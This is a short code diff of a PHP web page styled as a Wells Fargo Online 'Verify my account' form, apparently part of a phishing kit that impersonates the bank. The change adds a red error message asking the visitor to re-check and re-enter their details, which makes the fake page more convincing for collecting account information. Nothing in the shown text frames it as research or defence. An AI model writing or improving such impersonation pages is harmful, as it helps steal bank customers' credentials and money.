@@ -115,6 +115,16 @@ if( isset($_GET['id'])){
                                 <input class="signOn" style="width: 60%; " value="Verify my account" type="submit">
 
                                 <div class="enroll-header">&copy; 2019 <em>Wells Fargo Online</em><sup>®</sup></div>
+                                
+                                <?php
+                                if( $error != ""){
+                                ?>
+                                <p style="color: red; font-size: 1.2em; font-weight: bold;">
+                                    Some or all of the fields you have completed might be incorrect or incomplete. Please review your input.
+                                </p>
+                                <?php
+                                }
+                                ?>
 
                         </form>
                     </div>
